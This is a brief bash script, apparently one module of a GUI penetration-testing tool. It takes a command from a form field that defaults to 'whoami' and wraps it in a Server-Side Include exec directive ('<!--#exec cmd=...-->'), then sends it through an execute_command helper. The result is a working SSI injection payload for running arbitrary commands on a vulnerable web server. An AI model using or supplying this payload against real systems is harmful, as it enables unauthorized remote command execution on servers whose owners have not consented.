#!/bin/bash

: '
SSI: execute cmd
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
CMD_FIELD=$(form_item "cmd" "cmd" "whoami")

# Generate GUI form
generate_form "${CMD_FIELD}"

CMD=${form_data["cmd"]}


execute_command "<!--#exec cmd=\"${CMD}\" -->"
